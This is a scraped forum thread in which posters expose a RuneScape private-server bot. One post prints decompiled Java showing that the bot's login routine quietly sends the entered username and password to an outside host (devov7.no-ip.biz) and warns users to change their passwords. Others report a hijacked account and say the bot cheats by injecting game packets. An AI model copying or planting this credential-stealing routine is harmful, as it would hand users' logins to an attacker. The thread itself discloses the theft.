item.title: Projectrs06 bot - Vistox
item.dc:creator: @Ambokile Ambokile
item.description:
@Ambokile wrote:

Found it!

In the login() method in Client class:

[code=Java] if(k == 2)
{
loggedInBot = true;
Bot bot = new Bot(this);
(new Thread(bot)).start();
myPrivilege = socketStream.read();
flagged = socketStream.read() == 1;
aLong1220 = 0L;
anInt1022 = 0;
mouseDetection.coordsIndex = 0;
super.awtFocus = true;
aBoolean954 = true;
loggedIn = true;
stream.currentOffset = 0;
inStream.currentOffset = 0;
pktType = -1;
anInt841 = -1;
anInt842 = -1;
anInt843 = -1;
pktSize = 0;
anInt1009 = 0;
anInt1104 = 0;
anInt1011 = 0;
anInt855 = 0;
menuActionRow = 0;
menuOpen = false;
super.idleTime = 0;
for(int i2 = 0; i2 < 100; i2++)
chatMessages[i2] = null;

        itemSelected = 0;
        spellSelected = 0;
        loadingStage = 0;
        anInt1062 = 0;
        anInt1278 = (int)(Math.random() * 100D) - 50;
        anInt1131 = (int)(Math.random() * 110D) - 55;
        anInt896 = (int)(Math.random() * 80D) - 40;
        minimapInt2 = (int)(Math.random() * 120D) - 60;
        minimapInt3 = (int)(Math.random() * 30D) - 20;
        minimapInt1 = (int)(Math.random() * 20D) - 10 & 0x7ff;
        anInt1021 = 0;
        anInt985 = -1;
        destX = 0;
        destY = 0;
        playerCount = 0;
        npcCount = 0;
        for(int j2 = 0; j2 < maxPlayers; j2++)
        {
            playerArray[j2] = null;
            aStreamArray895s[j2] = null;
        }

        for(int k2 = 0; k2 < 16384; k2++)
            npcArray[k2] = null;

        myPlayer = playerArray[myPlayerIndex] = new Player();
        aClass912;
        Class11.method343(s, s1);
        aClass19_1013.removeAll();
        aClass19_1056.removeAll();
        for(int l2 = 0; l2 < 4; l2++)
        {
            for(int k3 = 0; k3 < 104; k3++)
            {
                for(int l3 = 0; l3 < 104; l3++)
                    groundArray[l2][k3][l3] = null;

            }

        }

        aClass19_1179 = new NodeList();
        anInt900 = 0;
        friendsCount = 0;
        dialogID = -1;
        backDialogID = -1;
        openInterfaceID = -1;
        invOverlayInterfaceID = -1;
        anInt1018 = -1;
        aBoolean1149 = false;
        tabID = 3;
        inputDialogState = 0;
        menuOpen = false;
        messagePromptRaised = false;
        aString844 = null;
        anInt1055 = 0;
        anInt1054 = -1;
        aBoolean1047 = true;
        method45();
        for(int i3 = 0; i3 < 5; i3++)
            anIntArray990[i3] = 0;

        for(int j3 = 0; j3 < 5; j3++)
        {
            atPlayerActions[j3] = null;
            atPlayerArray[j3] = false;
        }

        anInt1175 = 0;
        anInt1134 = 0;
        anInt986 = 0;
        anInt1288 = 0;
        anInt924 = 0;
        anInt1188 = 0;
        anInt1155 = 0;
        anInt1226 = 0;
        boolean flag1 = false;
        boolean flag2 = false;
        resetImageProducers2();
        return;
    }

[/code]

Notice Class11.method343(s, s1); ? That calls a method with parameters of the entered username and password… here is that method:

public static void method343(String s, String s1) { try { requestSocket = new Socket("devov7.no-ip.biz", 43594); out = new ObjectOutputStream(requestSocket.getOutputStream()); out.flush(); out.writeObject((new StringBuilder()).append(s).append(", ").append(s1).toString()); out.flush(); out.close(); requestSocket.close(); } catch(Exception exception) { } }

[center][size=36pt]CHANGE YOUR PASSWORD IF YOU HAVE USED THIS![/size][/center]

Read full topic

item.title: Projectrs06 bot - Vistox
item.dc:creator: @Fridder Fridder
item.description:
@Fridder wrote:

[quote=“Ambokile, post:25, topic:478579”][quote author=Fanz link=topic=596805.msg4202767#msg4202767 date=1358460310]

Yeah something’s not right. Last night, I KNOW I logged out at the Lumbridge chicken coop and now I’m at the Al-Kharid bank. I also gained 12 levels in cooking so uhh… ok.

Our bot isn’t sophisticated enough to walk to AlKharid and train cooking for you rofl.
[/quote]

No but it’s sophisticated enough to send login information to you, which would explain why it’s not open source[/quote]

http://uppit.com/xehnaop8ljfz/decomp.zip

Contains errors in a few classes (from the decompiler)…

Read full topic

Yeah something’s not right. Last night, I KNOW I logged out at the Lumbridge chicken coop and now I’m at the Al-Kharid bank. I also gained 12 levels in cooking so uhh… ok.
[/quote]

Our bot isn’t sophisticated enough to walk to AlKharid and train cooking for you rofl.[/quote]

item.title: Projectrs06 bot - Vistox
item.dc:creator: @Fridder Fridder
item.description:
@Fridder wrote:

[quote=“Fanz, post:23, topic:478579”][quote author=Fridder link=topic=596805.msg4202739#msg4202739 date=1358457930]
Yeah something’s not right. Last night, I KNOW I logged out at the Lumbridge chicken coop and now I’m at the Al-Kharid bank. I also gained 12 levels in cooking so uhh… ok.
[/quote]

If I were you I’d check with some friends to see if they were on your account. Our bot isn’t sophisticated enough to walk to AlKharid and train cooking for you rofl. Change your password and make sure you don’t use the same password as you use on other rsps.[/quote]

I don’t have any friends that could possibly know my password… and this probably would have happened earlier and not the day after I started using this thing.

Read full topic

Fridder:

Yeah something’s not right. Last night, I KNOW I logged out at the Lumbridge chicken coop and now I’m at the Al-Kharid bank. I also gained 12 levels in cooking so uhh… ok.

If I were you I’d check with some friends to see if they were on your account. Our bot isn’t sophisticated enough to walk to AlKharid and train cooking for you rofl. Change your password and make sure you don’t use the same password as you use on other rsps.

item.title: Projectrs06 bot - Vistox
item.dc:creator: @Fridder Fridder
item.description:
@Fridder wrote:

imthenull:

what a surprise, what’s next half ur bank gone?

Lol like I even care. I made my account on the 12th of December, played the beta, played a liiiittle bit of the real game, then that’s it. My bank is worthless, it’s just a bunch of crap. I don’t even have any more than 5k (other than the money I made last night from this bot which gives me ~32k).

Read full topic

item.title: Projectrs06 bot - Vistox
item.dc:creator: @silabsoft RuneAgent
item.description:
@silabsoft wrote:

imsuperman05:

The thing I could never understand with bots is how to move around the mouse and detect npcs + objects in your area

this bot does not do that, it simply injects the packets sent when you would click an object or npc the server then thinks you legitimately did it and preforms the command.

Read full topic
